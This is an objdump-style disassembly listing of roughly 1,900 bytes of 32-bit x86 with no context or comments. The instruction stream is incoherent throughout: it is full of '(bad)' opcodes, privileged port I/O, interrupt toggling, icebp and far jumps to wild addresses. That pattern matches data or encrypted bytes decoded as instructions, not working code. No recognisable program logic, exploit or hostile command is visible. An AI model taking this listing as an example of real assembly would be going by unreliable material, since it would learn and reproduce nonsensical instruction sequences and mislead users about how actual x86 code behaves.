  40fd6c:	out    dx,eax
  40fd6d:	xor    al,ah
  40fd6f:	jge    0x40fdb9
  40fd71:	mov    al,BYTE PTR [ebp+0xd0d0b24]
  40fd77:	sti    
  40fd78:	fcom   DWORD PTR [edi+0x60b45529]
  40fd7e:	bound  edi,QWORD PTR ds:0x36747051
  40fd84:	imul   eax,DWORD PTR [esi-0x45fb82bc],0xffffffa0
  40fd8b:	mov    al,0x52
  40fd8d:	test   al,0x8e
  40fd8f:	sub    BYTE PTR [eax-0x2ae2e747],bl
  40fd95:	xlat   BYTE PTR ds:[ebx]
  40fd96:	gs ss lahf 
  40fd99:	mov    dh,0x87
  40fd9b:	jnp    0x40fdeb
  40fd9d:	push   es
  40fd9e:	pushf  
  40fd9f:	xor    dh,BYTE PTR [edx]
  40fda1:	loope  0x40fdcf
  40fda3:	jns    0x40fd5b
  40fda5:	scas   al,BYTE PTR es:[edi]
  40fda6:	mov    ecx,0x6be33631
  40fdab:	cmp    BYTE PTR [esi-0x71],ah
  40fdae:	xchg   esp,eax
  40fdaf:	dec    edi
  40fdb0:	cs scas al,BYTE PTR es:[edi]
  40fdb2:	dec    BYTE PTR [esi-0x5d5786f0]
  40fdb8:	add    al,0x81
  40fdba:	jno    0x40fdb4
  40fdbc:	sub    esp,edi
  40fdbe:	ret    0x8bcf
  40fdc1:	mov    eax,ds:0x1f56aff2
  40fdc6:	pop    ebp
  40fdc7:	jl     0x40fdd6
  40fdc9:	cwde   
  40fdca:	jbe    0x40fd6c
  40fdcc:	aam    0xe8
  40fdce:	xor    bh,BYTE PTR [esi]
  40fdd0:	dec    ebx
  40fdd1:	shl    BYTE PTR [edi-0x23],cl
  40fdd4:	cli    
  40fdd5:	sub    al,0x2c
  40fdd7:	push   esp
  40fdd8:	xchg   ecx,eax
  40fdd9:	mov    esp,0xdc2065b4
  40fdde:	xchg   esp,eax
  40fddf:	arpl   WORD PTR [edi],si
  40fde1:	mov    esi,0x2a5cf302
  40fde6:	sahf   
  40fde7:	sub    bl,BYTE PTR [edi+0x57]
  40fdea:	or     eax,0xfa9846da
  40fdef:	fsubr  QWORD PTR [edi]
  40fdf1:	call   0x28504af9
  40fdf6:	push   esp
  40fdf7:	mov    ?,WORD PTR [ecx+0x668032e4]
  40fdfd:	sub    eax,0x39344429
  40fe02:	mov    dh,0xdf
  40fe04:	je     0x40fe3a
  40fe06:	add    bl,bl
  40fe08:	dec    ecx
  40fe09:	jne    0x40fe30
  40fe0b:	psubw  mm4,mm6
  40fe0e:	mov    bl,0xac
  40fe10:	jmp    0x40fe82
  40fe12:	xchg   BYTE PTR [edi+0x3b6eb05b],bl
  40fe18:	(bad)  
  40fe19:	in     eax,dx
  40fe1a:	pop    edi
  40fe1b:	jl     0x40fe74
  40fe1d:	sub    dh,BYTE PTR [esi-0x21]
  40fe20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe21:	cmp    ebx,DWORD PTR [edx+0x15]
  40fe24:	bound  ebp,QWORD PTR [edx-0x6fe16d63]
  40fe2a:	cmp    esp,0x6
  40fe2d:	loopne 0x40fe77
  40fe2f:	mov    eax,ds:0x15861ccb
  40fe34:	ficom  WORD PTR [esi-0x1de5450f]
  40fe3a:	and    edx,DWORD PTR [edx]
  40fe3c:	pop    es
  40fe3d:	dec    esi
  40fe3e:	dec    edi
  40fe3f:	or     BYTE PTR [edi+0x39a78da8],ch
  40fe45:	mov    al,ds:0x51676757
  40fe4a:	jg     0x40fe18
  40fe4c:	xchg   edx,eax
  40fe4d:	push   ds
  40fe4e:	lods   eax,DWORD PTR ds:[esi]
  40fe4f:	neg    DWORD PTR ds:0x2a6891c2
  40fe55:	in     al,dx
  40fe56:	or     BYTE PTR [ebx+0x24],al
  40fe59:	push   es
  40fe5a:	outs   dx,BYTE PTR ds:[esi]
  40fe5b:	pop    ecx
  40fe5c:	xor    dl,BYTE PTR [esi+esi*2]
  40fe5f:	in     al,dx
  40fe60:	fnsave [esi+0x43670111]
  40fe66:	sahf   
  40fe67:	push   edx
  40fe68:	jne    0x40fe82
  40fe6a:	mov    edx,0x9b2fb7ef
  40fe6f:	ficom  DWORD PTR [eax+0x5f]
  40fe72:	popf   
  40fe73:	addr16 repnz mov ch,0x8c
  40fe77:	pushf  
  40fe78:	xor    DWORD PTR [edi],esi
  40fe7a:	sub    eax,0x3a967dc
  40fe7f:	mov    ?,WORD PTR [eax-0x719d081]
  40fe85:	or     ebp,DWORD PTR [edx-0x324c9a95]
  40fe8b:	ins    DWORD PTR es:[edi],dx
  40fe8c:	mov    ch,0xc5
  40fe8e:	mov    ds:0x14412371,al
  40fe93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe94:	ficom  DWORD PTR [esi]
  40fe96:	stc    
  40fe97:	xchg   ecx,eax
  40fe98:	fisub  DWORD PTR [edi+0x2d]
  40fe9b:	pop    eax
  40fe9c:	jnp    0x40fefe
  40fe9e:	or     al,0xb
  40fea0:	(bad)  
  40fea1:	retf   0x333b
  40fea4:	pop    ebp
  40fea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fea6:	cmp    eax,0x68b9ad2c
  40feab:	out    dx,eax
  40feac:	mov    dl,0x12
  40feae:	(bad)  
  40feaf:	jl     0x40fe6e
  40feb1:	sub    ch,BYTE PTR [edi]
  40feb3:	lods   al,BYTE PTR ds:[esi]
  40feb4:	rol    BYTE PTR [eax+0x198d2849],1
  40feba:	out    0x60,al
  40febc:	shl    cl,1
  40febe:	cmp    DWORD PTR [esi],0x68a06cb7
  40fec4:	add    bh,bl
  40fec6:	push   dx
  40fec8:	sub    eax,0x2f750927
  40fecd:	or     DWORD PTR [edi],0x66
  40fed0:	jmp    0xca74:0x983a2c84
  40fed7:	mov    edi,0x4c4ae926
  40fedc:	in     eax,0x98
  40fede:	mov    fs:0xc86dc07,eax
  40fee4:	data16 cmp al,0x16
  40fee7:	xor    DWORD PTR [esp+ebx*1],ebp
  40feea:	adc    DWORD PTR [edx],ebp
  40feec:	add    edx,DWORD PTR [esi]
  40feee:	jnp    0x40fe7f
  40fef0:	ret    0xf16f
  40fef3:	(bad)  
  40fef4:	sti    
  40fef5:	or     ebx,DWORD PTR [eax+0x76]
  40fef8:	cld    
  40fef9:	dec    edx
  40fefa:	mov    ch,0x3c
  40fefc:	sub    eax,0x2db14fa3
  40ff01:	dec    ebx
  40ff02:	arpl   WORD PTR [esi],ax
  40ff04:	std    
  40ff05:	rol    BYTE PTR [ebx+0xb9cd65a],0x35
  40ff0c:	in     al,0x82
  40ff0e:	adc    al,0x47
  40ff10:	cli    
  40ff11:	shl    BYTE PTR [edx+esi*8+0x6fab0dda],cl
  40ff18:	add    bl,BYTE PTR [ebp-0x28ee322f]
  40ff1e:	(bad)  
  40ff1f:	jmp    0xc88f91a2
  40ff24:	lods   eax,DWORD PTR ds:[esi]
  40ff25:	lods   al,BYTE PTR ds:[esi]
  40ff27:	ficomp DWORD PTR [esp+ecx*8-0x7a99ed1b]
  40ff2e:	int    0x84
  40ff30:	(bad)  
  40ff31:	push   cs
  40ff32:	mov    al,ds:0x291c65c8
  40ff37:	push   ebp
  40ff38:	sbb    al,0x68
  40ff3a:	je     0x40ffbb
  40ff3c:	adc    cl,BYTE PTR [edi+0x1e]
  40ff3f:	sbb    DWORD PTR [eax],esi
  40ff41:	sbb    BYTE PTR [ebx+0x55],0xe2
  40ff45:	jns    0x40fefd
  40ff47:	stc    
  40ff48:	jnp    0x40ff20
  40ff4a:	mov    dh,BYTE PTR [eax]
  40ff4c:	into   
  40ff4d:	fimul  DWORD PTR [edi-0x7]
  40ff50:	and    DWORD PTR [ebx-0x3a54e75c],ebx
  40ff56:	push   esp
  40ff57:	push   edi
  40ff58:	mov    ecx,0xfadebca3
  40ff5d:	xor    al,0xd7
  40ff5f:	(bad)  
  40ff60:	jb     0x40ff91
  40ff62:	add    BYTE PTR [edx+0x37351a40],ah
  40ff68:	addr16 out 0x9c,al
  40ff6b:	mov    ds:0xee032bc6,al
  40ff70:	push   esp
  40ff71:	jle    0x40ffd7
  40ff73:	cmp    bl,BYTE PTR [ebx+0x230e1cfb]
  40ff79:	and    BYTE PTR [ebp+0x70],bl
  40ff7c:	mov    esp,0xced4bdf0
  40ff81:	pop    eax
  40ff82:	dec    DWORD PTR [edi]
  40ff84:	(bad)
  40ff87:	je     0x40ff65
  40ff89:	sub    BYTE PTR [edx-0x5329a07c],bh
  40ff8f:	ins    DWORD PTR es:[edi],dx
  40ff90:	mov    ds:0x10f4f54a,eax
  40ff95:	or     eax,0x1cc48d90
  40ff9a:	ror    BYTE PTR [esi],0xba
  40ff9d:	lea    ebp,[eax-0x41]
  40ffa0:	pop    ds
  40ffa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffa2:	mov    ds:0x79b78aba,al
  40ffa7:	sbb    bh,ah
  40ffa9:	pushf  
  40ffaa:	pusha  
  40ffab:	inc    edi
  40ffac:	sar    DWORD PTR [edi],cl
  40ffae:	(bad)
  40ffb2:	pop    ss
  40ffb3:	pop    ebp
  40ffb4:	jmp    0xd2ad9771
  40ffb9:	adc    eax,0x41ad532e
  40ffbe:	sub    eax,0x31d529ea
  40ffc3:	retf   0x48b9
  40ffc6:	mov    DWORD PTR [ebp-0x44],esp
  40ffc9:	cdq    
  40ffca:	mov    bh,0x8c
  40ffcc:	xchg   ecx,eax
  40ffcd:	push   edi
  40ffce:	sub    esp,DWORD PTR [esi+esi*4-0x92284d9]
  40ffd5:	bound  edi,QWORD PTR [ebx-0x75a39c50]
  40ffdb:	(bad)  
  40ffdd:	cs mov esp,0x33970a70
  40ffe3:	sbb    ebx,ecx
  40ffe5:	dec    ecx
  40ffe6:	icebp  
  40ffe7:	(bad)  
  40ffe9:	dec    ebp
  40ffea:	mov    eax,0xefd0f528
  40ffef:	inc    esp
  40fff0:	sub    dl,BYTE PTR [edx-0x1]
  40fff3:	rcr    BYTE PTR [ebx+edi*2-0x3cf37a33],0xf9
  40fffb:	sbb    eax,0xbf13b957
  410000:	pop    es
  410001:	inc    ecx
  410002:	mov    ds:0xf905e3cf,eax
  410007:	fldenv [ecx*2+0xd3e6a44]
  41000e:	sti    
  41000f:	push   esi
  410010:	sbb    esp,DWORD PTR [ecx+0x2c]
  410013:	jne    0x40ffb7
  410015:	inc    ebp
  410016:	inc    edx
  410017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410018:	dec    esp
  410019:	pop    ecx
  41001a:	xor    BYTE PTR [esi+0x38517d71],bh
  410020:	stos   DWORD PTR es:[edi],eax
  410021:	lahf   
  410022:	int3   
  410023:	repnz sbb BYTE PTR [eax-0x70d76e0b],dh
  41002a:	int3   
  41002b:	in     eax,0xb1
  41002d:	mov    edx,0xd8e38467
  410032:	jecxz  0x410009
  410034:	(bad)  
  410035:	aas    
  410036:	inc    esp
  410037:	push   esp
  410038:	push   ss
  410039:	lahf   
  41003a:	(bad)  [eax-0x387b7d93]
  410040:	adc    bh,ah
  410042:	push   esi
  410043:	mov    edx,0x2ebc00a1
  410048:	sbb    eax,DWORD PTR ds:0x71616234
  41004e:	pshufw mm6,QWORD PTR [edx-0x1c],0x30
  410053:	jbe    0x40ffec
  410055:	cdq    
  410056:	mov    ch,0xa8
  410058:	(bad)  [esi-0x40cf21b7]
  41005e:	mov    WORD PTR [ecx-0x8],ss
  410061:	adc    DWORD PTR [esp+eax*1+0x5],edx
  410065:	retf   0xb818
  410068:	pop    ds
  410069:	outs   dx,DWORD PTR ds:[esi]
  41006a:	push   ebp
  41006b:	sub    esi,DWORD PTR [esi-0x30]
  41006e:	inc    eax
  41006f:	repz shr BYTE PTR [ebx],1
  410072:	scas   eax,DWORD PTR es:[edi]
  410073:	popf   
  410074:	(bad)  
  410075:	int3   
  410076:	mov    ah,0x3c
  410078:	mov    eax,ds:0x44eb0f80
  41007d:	ss xchg esi,eax
  41007f:	js     0x41001a
  410081:	push   ds
  410082:	mov    esi,0x99e31ef3
  410087:	data16 clc 
  410089:	jnp    0x410045
  41008b:	pop    edi
  41008c:	sub    al,0x95
  41008e:	mov    eax,ds:0xada6ab48
  410093:	add    DWORD PTR [edx+0x21],esi
  410096:	stc    
  410097:	jge    0x410061
  410099:	leave  
  41009a:	dec    esi
  41009b:	test   eax,0xe74712dd
  4100a0:	fadd   st(4),st
  4100a2:	leave  
  4100a3:	adc    cl,BYTE PTR [edx+0x74]
  4100a6:	aam    0x33
  4100a8:	aaa    
  4100a9:	scas   eax,DWORD PTR es:[edi]
  4100aa:	leave  
  4100ab:	push   0x1a
  4100ad:	inc    esp
  4100ae:	pop    edi
  4100af:	aaa    
  4100b0:	das    
  4100b1:	inc    edi
  4100b2:	ss (bad) 
  4100b4:	int3   
  4100b5:	aam    0xf6
  4100b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100b8:	rol    DWORD PTR [ecx+0x33],1
  4100bb:	mov    ecx,0x94c15373
  4100c0:	jnp    0x4100a4
  4100c2:	outs   dx,DWORD PTR ds:[esi]
  4100c3:	clc    
  4100c4:	sbb    ebp,DWORD PTR [ecx+0x642db80a]
  4100ca:	add    eax,0xc4657c67
  4100cf:	jl     0x410138
  4100d1:	lods   al,BYTE PTR ss:[esi]
  4100d3:	dec    ebp
  4100d4:	loop   0x41009e
  4100d6:	mov    ah,0xce
  4100d8:	adc    DWORD PTR [eax+0x7a67a6fe],0xfffffff1
  4100df:	jno    0x4100a3
  4100e1:	lods   al,BYTE PTR ds:[esi]
  4100e2:	mov    ebx,0xf88c6d1
  4100e7:	jns    0x41015b
  4100e9:	test   DWORD PTR [eax],esp
  4100eb:	push   ebp
  4100ec:	out    dx,al
  4100ed:	push   ds
  4100ee:	jo     0x41007f
  4100f0:	sahf   
  4100f1:	sub    al,0xe9
  4100f3:	(bad)  [esi-0x35]
  4100f6:	in     al,dx
  4100f7:	stc    
  4100f8:	stos   BYTE PTR es:[edi],al
  4100f9:	mov    al,0xd
  4100fb:	jo     0x410127
  4100fd:	jne    0x410139
  4100ff:	cli    
  410100:	mov    esp,0xa3adf31b
  410105:	lock cmc 
  410107:	xchg   esp,eax
  410108:	div    DWORD PTR [esi-0x2c]
  41010b:	mov    bh,0xd5
  41010d:	ror    dl,1
  41010f:	and    eax,0x114fa864
  410114:	push   ecx
  410115:	xor    al,0x2f
  410117:	jbe    0x39d14892
  41011d:	sub    al,0xd5
  41011f:	jmp    0x41014d
  410121:	sub    eax,0x56002a66
  410126:	jp     0x410175
  410128:	cld    
  410129:	popf   
  41012a:	outs   dx,BYTE PTR ds:[esi]
  41012b:	fstp   QWORD PTR [ebx-0x6e8e9070]
  410131:	loopne 0x4101b2
  410133:	sti    
  410134:	aam    0x9d
  410136:	scas   eax,DWORD PTR es:[edi]
  410137:	dec    ebp
  410138:	pop    ecx
  410139:	dec    ebx
  41013a:	adc    edi,esp
  41013c:	call   0x431f456f
  410141:	enter  0x1393,0x31
  410145:	mov    al,0x81
  410147:	scas   al,BYTE PTR es:[edi]
  410148:	mov    ebx,0x6ca3c7be
  41014d:	dec    edx
  41014e:	mov    edi,0x39b010df
  410153:	(bad)  
  410154:	fisub  WORD PTR [edx+0x78]
  410157:	sub    al,cl
  410159:	sahf   
  41015a:	cli    
  41015b:	sar    DWORD PTR [ecx],cl
  41015d:	daa    
  41015e:	pop    edi
  41015f:	pop    ebx
  410160:	mov    eax,ds:0x90a67036
  410165:	jp     0x4101bb
  410167:	sub    edi,DWORD PTR [eax]
  410169:	push   esp
  41016a:	popf   
  41016b:	inc    esi
  41016c:	xor    ebp,DWORD PTR [ebp-0x5b]
  41016f:	daa    
  410170:	adc    DWORD PTR [edi-0x74],eax
  410173:	mov    ebp,0x2773ae29
  410178:	cmp    BYTE PTR [ebx],dh
  41017a:	jp     0x410176
  41017c:	popa   
  41017d:	push   edi
  41017e:	test   BYTE PTR [eax+0x5fe2b36d],ah
  410184:	sbb    ebp,edi
  410186:	pop    ebx
  410187:	sbb    eax,0x18f78b23
  41018c:	js     0x41014b
  41018e:	and    DWORD PTR [eax],ebp
  410190:	mov    cl,0x38
  410192:	loopne 0x41016a
  410194:	mov    esp,0xbdb2b872
  410199:	pop    ecx
  41019a:	scas   eax,DWORD PTR es:[edi]
  41019b:	mov    dl,0x19
  41019d:	pusha  
  41019e:	(bad)  
  41019f:	out    0xf,al
  4101a1:	loopne 0x4101d7
  4101a3:	icebp  
  4101a4:	mov    al,ds:0x9fbecb67
  4101a9:	add    DWORD PTR [edi+0x41],0x43
  4101ad:	and    BYTE PTR [ecx+0x26f5e7b0],dl
  4101b3:	xor    cl,BYTE PTR [edi+ebx*1]
  4101b6:	loop   0x410176
  4101b8:	lock fbld TBYTE PTR [esi]
  4101bb:	inc    ebp
  4101bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101bd:	icebp  
  4101be:	into   
  4101bf:	and    esp,ecx
  4101c1:	mov    ds:0x2510e2c3,eax
  4101c6:	adc    eax,0xfaa3f767
  4101cb:	add    al,0x69
  4101cd:	add    bh,dl
  4101cf:	dec    edi
  4101d0:	or     BYTE PTR [ebx-0x5c2e83b6],al
  4101d6:	mov    eax,ds:0x9bd086ea
  4101db:	jb     0x410161
  4101dd:	mov    bh,0x8e
  4101df:	cwde   
  4101e0:	xor    eax,0xfd4977a3
  4101e5:	xor    eax,DWORD PTR [ecx-0x4c8c6e18]
  4101eb:	adc    eax,DWORD PTR [ebx-0x446e665f]
  4101f1:	je     0x4101aa
  4101f3:	sbb    al,0xea
  4101f5:	out    dx,al
  4101f6:	adc    al,0x30
  4101f8:	inc    eax
  4101f9:	aas    
  4101fa:	(bad)  
  4101fb:	in     eax,dx
  4101fc:	xchg   ah,bl
  4101fe:	push   ebx
  4101ff:	xchg   esp,eax
  410200:	add    al,0xb7
  410202:	loopne 0x410257
  410204:	(bad)  
  410206:	jmp    0x6fff5c9c
  41020b:	test   DWORD PTR ds:0xa34e0de4,esp
  410211:	add    eax,0xc7dad987
  410216:	lahf   
  410217:	nop
  410218:	fisttp DWORD PTR [edi+0x56611b39]
  41021e:	out    0x45,eax
  410220:	and    ecx,esp
  410222:	push   es
  410223:	sub    al,0xb6
  410225:	pop    edx
  410226:	mov    al,0x53
  410228:	jo     0x4101db
  41022a:	jbe    0x410219
  41022c:	rcr    DWORD PTR [edi-0x41],1
  41022f:	(bad)  
  410230:	xchg   esp,eax
  410231:	add    DWORD PTR [eax],esi
  410233:	push   ecx
  410234:	push   cs
  410235:	adc    edi,DWORD PTR [edx-0x3f]
  410238:	inc    eax
  410239:	mov    BYTE PTR [esi+ebp*8],bl
  41023c:	dec    ebp
  41023d:	push   eax
  41023e:	or     DWORD PTR [ebx],esi
  410240:	mov    edx,0x2fb22e9b
  410245:	aam    0x44
  410247:	aaa    
  410248:	or     dl,dh
  41024a:	std    
  41024b:	mov    edi,0xe59b1583
  410250:	jne    0x4102aa
  410252:	jg     0x4102b9
  410254:	call   0xb6ed3a3e
  410259:	dec    edi
  41025a:	dec    ebp
  41025b:	and    BYTE PTR [edi-0x3669bd41],dh
  410261:	sub    ecx,DWORD PTR [eax]
  410263:	push   edi
  410264:	mov    ds:0xa9998e91,al
  410269:	out    dx,eax
  41026a:	lods   eax,DWORD PTR ds:[esi]
  41026b:	sub    al,0x1
  41026d:	jmp    0x87d5d808
  410272:	(bad)  
  410274:	add    BYTE PTR [ebx],ah
  410276:	jecxz  0x4102f6
  410278:	aaa    
  410279:	xchg   BYTE PTR [ebx],ch
  41027b:	mov    DWORD PTR [esi+0x58],esi
  41027e:	xlat   BYTE PTR ds:[ebx]
  41027f:	(bad)  
  410281:	jmp    0x410242
  410283:	iret   
  410284:	ss cs jmp 0x828c:0xf9788b6c
  41028d:	out    0xe5,eax
  41028f:	add    BYTE PTR [ebp+0x76ab5c50],dh
  410295:	sti    
  410296:	js     0x410265
  410298:	and    DWORD PTR ds:0x74abc577,ecx
  41029e:	cdq    
  41029f:	pop    ecx
  4102a0:	adc    eax,0x3784d08d
  4102a5:	fmul   st(1),st
  4102a7:	pop    esp
  4102a8:	mov    ds:0x6a09ff38,eax
  4102ad:	nop
  4102ae:	sub    ebp,esi
  4102b0:	int3   
  4102b1:	leave  
  4102b2:	in     al,0xc3
  4102b4:	je     0x4102e4
  4102b6:	dec    ebx
  4102b7:	test   DWORD PTR [ebp+ecx*2-0x7c],0x78149436
  4102bf:	dec    ecx
  4102c0:	add    al,0xd7
  4102c2:	pop    es
  4102c3:	jge    0x410287
  4102c5:	into   
  4102c6:	das    
  4102c7:	daa    
  4102c8:	ins    BYTE PTR es:[edi],dx
  4102c9:	push   es
  4102ca:	jmp    0xa6956c85
  4102cf:	cdq    
  4102d0:	pop    esi
  4102d1:	retf   0x5a2c
  4102d4:	pop    ss
  4102d5:	jmp    0x410286
  4102d7:	addr16 mov ebp,0x6d2eb498
  4102dd:	xchg   esi,eax
  4102de:	mov    al,0x41
  4102e0:	mov    esi,0xd6a7a3b1
  4102e5:	mov    DWORD PTR [eax+0x74],ebp
  4102e8:	or     ah,cl
  4102ea:	xchg   edx,eax
  4102eb:	and    eax,0xc080ba25
  4102f0:	test   al,0xf1
  4102f2:	sub    DWORD PTR [edi],eax
  4102f4:	(bad)  
  4102f5:	fidivr DWORD PTR [esi+0x2d]
  4102f8:	xchg   bh,ch
  4102fa:	jae    0x4102f0
  4102fc:	inc    ebx
  4102fd:	dec    esp
  4102fe:	xor    eax,0x31673380
  410303:	ja     0x410335
  410305:	lods   eax,DWORD PTR ds:[esi]
  410306:	mov    al,0x15
  410308:	fst    DWORD PTR [edx]
  41030a:	in     al,dx
  41030b:	rcl    BYTE PTR [ebx+eiz*4-0x3da74ba6],1
  410312:	mov    DWORD PTR [ecx+0x71],ebp
  410315:	enter  0x20b1,0xde
  410319:	pop    edx
  41031a:	jb     0x4102f1
  41031c:	iret   
  41031d:	or     DWORD PTR [ecx-0x2845002c],esi
  410323:	pop    ebx
  410324:	sti    
  410325:	repz jmp 0xe7b9:0x3876c16a
  41032d:	ficomp WORD PTR [eax]
  41032f:	or     esp,DWORD PTR [ebx+0x5e]
  410332:	aas    
  410333:	pop    ds
  410334:	lods   eax,DWORD PTR ds:[esi]
  410335:	add    ch,bh
  410337:	fisttp QWORD PTR [eax+0x28e00abf]
  41033d:	clc    
  41033e:	ret    0xc29
  410341:	xchg   bl,ch
  410343:	pushf  
  410344:	mov    esi,0x2b9762f4
  410349:	inc    eax
  41034a:	xor    eax,0xfa343944
  41034f:	dec    ebp
  410350:	cmp    esp,eax
  410352:	je     0x4102db
  410354:	sub    eax,0x2de27889
  410359:	pop    esp
  41035a:	adc    al,0x61
  41035c:	ret    
  41035d:	dec    esp
  41035e:	pusha  
  41035f:	jo     0x4102fd
  410361:	adc    eax,0xcfe4e155
  410366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410367:	xor    al,0x26
  410369:	int3   
  41036a:	out    0xa,al
  41036c:	jno    0x4103b4
  41036e:	add    ecx,ebx
  410370:	mov    ds:0x388cbf46,eax
  410375:	xor    eax,0x1df91131
  41037a:	mov    dh,0xad
  41037c:	jp     0x4103f1
  41037e:	inc    eax
  41037f:	(bad)  
  410380:	jno    0x4103b1
  410382:	rcr    BYTE PTR ds:0x9950214d,0xeb
  410389:	sub    bl,BYTE PTR [edi-0x4]
  41038c:	xchg   edi,eax
  41038d:	push   cs
  41038e:	mov    al,ds:0xdc8b74f9
  410393:	push   esp
  410394:	adc    BYTE PTR [edx+0x1],al
  410397:	pop    ds
  410398:	add    eax,0x85d57042
  41039d:	jmp    0x1d30:0x2fe0b600
  4103a4:	loope  0x410358
  4103a6:	or     BYTE PTR [esp+eax*4+0x7b],bl
  4103aa:	dec    esi
  4103ab:	mov    BYTE PTR [edx-0x60c254a2],ah
  4103b1:	mov    bl,0xf5
  4103b3:	push   es
  4103b4:	sbb    dh,BYTE PTR [ebx-0x4b]
  4103b7:	sbb    BYTE PTR [ebp+0x2967ceb9],dl
  4103bd:	sub    ah,BYTE PTR [edi+eax*8-0x1]
  4103c1:	into   
  4103c2:	cli    
  4103c3:	or     ebx,DWORD PTR [ebx-0x12]
  4103c6:	rcl    DWORD PTR [edx],1
  4103c8:	pop    ebx
  4103c9:	push   eax
  4103ca:	ret    
  4103cb:	imul   ecx,DWORD PTR [eax*4+0x7ff67e1e],0x76257da5
  4103d6:	add    al,0x3e
  4103d8:	test   BYTE PTR [edx+0x4f0c8454],dh
  4103de:	(bad)  
  4103df:	aam    0x9b
  4103e1:	push   ds
  4103e2:	pushf  
  4103e3:	and    eax,0x26b6a7d0
  4103e8:	(bad)  
  4103ea:	jle    0x41041b
  4103ec:	or     edi,ebx
  4103ee:	stc    
  4103ef:	inc    ebp
  4103f0:	xchg   esi,eax
  4103f1:	je     0x410417
  4103f3:	stos   DWORD PTR es:[edi],eax
  4103f4:	mov    eax,0xd1798bf6
  4103f9:	cmp    ch,BYTE PTR [edi+eax*2]
  4103fc:	and    al,0x42
  4103fe:	xchg   esp,eax
  4103ff:	inc    eax
  410400:	outs   dx,DWORD PTR ds:[esi]
  410401:	jae    0x4103f5
  410403:	fcom   st(2)
  410405:	sub    BYTE PTR [ecx-0x23],bh
  410408:	popa   
  410409:	xor    DWORD PTR [esi+edx*2-0x35a8c058],edx
  410410:	sbb    DWORD PTR [esi],edi
  410412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410413:	mov    ebx,0x5bb722bb
  410418:	pop    esi
  410419:	cdq    
  41041a:	addr16 inc ecx
  41041c:	inc    edx
  41041d:	xor    esp,esp
  41041f:	mov    bh,0x9b
  410421:	xchg   esi,eax
  410422:	xor    eax,DWORD PTR [ecx+eiz*4+0x6e]
  410426:	ret    0xa569
  410429:	cwde   
  41042a:	out    dx,al
  41042b:	hlt    
  41042c:	loop   0x4103cd
  41042e:	out    dx,eax
  41042f:	rcr    DWORD PTR [ebx],1
  410431:	sti    
  410432:	mov    eax,0x5bc66670
  410437:	mov    ecx,0x3d4933fc
  41043c:	in     eax,0xb8
  41043e:	loop   0x41047c
  410440:	xor    al,0xa5
  410442:	inc    eax
  410443:	jae    0x410427
  410445:	fnstsw WORD PTR [ecx]
  410447:	shl    BYTE PTR [ecx+0x56f32bd5],1
  41044d:	clc    
  41044e:	shr    BYTE PTR cs:[ebx+0x6869f2e5],cl
  410455:	jg     0x4103f4
  410457:	adc    al,BYTE PTR ss:[edx-0x55]
  41045b:	outs   dx,BYTE PTR ds:[esi]
  41045c:	mov    dl,0xb
  41045e:	cmc    
  41045f:	aam    0x12
  410461:	inc    edx
  410462:	fs dec esi
  410464:	xchg   ecx,eax
  410465:	inc    eax
  410467:	mov    al,0xb2
  410469:	scas   eax,DWORD PTR es:[edi]
  41046a:	xor    eax,DWORD PTR [edx+0x8]
  41046d:	inc    edi
  41046e:	xor    edi,edx
  410470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410471:	icebp  
  410472:	test   ch,dh
  410474:	jae    0x41043b
  410476:	dec    esi
  410477:	jae    0x4104e3
  410479:	xchg   esp,eax
  41047a:	jns    0x4104a7
  41047c:	outs   dx,DWORD PTR ds:[esi]
  41047d:	(bad)  
  41047e:	mov    bl,0x8a
  410480:	(bad)  
  410481:	ss ret 0x5978
  410485:	sbb    ah,BYTE PTR [edi+0x62]
  410488:	push   esi
  410489:	mov    ch,0x4c
  41048b:	clc    
  41048c:	imul   esp,esp,0x5
  41048f:	pushf  
  410490:	(bad)  
  410491:	cmp    bh,BYTE PTR [ebx+ebp*1+0x2f2df0fc]
  410498:	adc    eax,0xf78ee42a
  41049d:	pop    edi
  41049e:	lea    esp,[ebx]
  4104a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104a1:	mov    ebx,0xa111c780
  4104a6:	clc    
  4104a7:	jg     0x410501
  4104a9:	in     al,dx
  4104aa:	or     edx,DWORD PTR [ebx]
  4104ac:	imul   edi,edi,0x41f13192
  4104b2:	shl    DWORD PTR [eax],1
  4104b4:	les    ebp,FWORD PTR [eax]
  4104b6:	xlat   BYTE PTR ds:[ebx]
  4104b7:	mov    ?,WORD PTR [ecx]
  4104b9:	fiadd  WORD PTR [eax+ecx*2-0x4ce2c27b]
  4104c0:	gs push cs
  4104c2:	and    BYTE PTR [edx],dl
  4104c4:	push   cs
  4104c5:	mov    ebp,0xe5890776
  4104ca:	lahf   
  4104cb:	xchg   edi,eax
  4104cc:	mov    ecx,0x3bd18284
  4104d1:	lahf   
  4104d2:	xchg   bh,al
  4104d4:	xor    BYTE PTR [edx-0x21],bh
  4104d7:	pop    es
  4104d8:	stos   BYTE PTR es:[edi],al
  4104d9:	fs inc eax
  4104db:	aam    0xe5
  4104dd:	push   ebp
  4104de:	dec    esp
  4104df:	and    al,0x4d
  4104e1:	out    0x22,eax
  4104e3:	ins    DWORD PTR es:[edi],dx
  4104e4:	clc    
  4104e5:	push   esi
  4104e6:	lds    ebx,FWORD PTR [edi]
  4104e8:	sub    eax,0x17926463
  4104ed:	push   ecx
  4104ee:	popf   
  4104ef:	pop    ecx
  4104f0:	rol    BYTE PTR [eax+0x3234ddad],cl
  4104f6:	lods   al,BYTE PTR ds:[esi]
  4104f7:	dec    ecx
  4104f8:	imul   esi,DWORD PTR ds:0x82e17f03,0x354c5b4a
  410502:	cld    
  410503:	add    dh,dl
  410505:	lds    ecx,FWORD PTR [edi+edx*2+0x36c680e5]
  41050c:	ins    DWORD PTR es:[edi],dx
  41050d:	stos   BYTE PTR es:[edi],al
  41050e:	mov    al,ds:0x45b67980
  410513:	mov    bh,0x65
  410515:	push   eax
  410516:	dec    edx
  410517:	outs   dx,BYTE PTR ds:[esi]
  410518:	dec    ebp
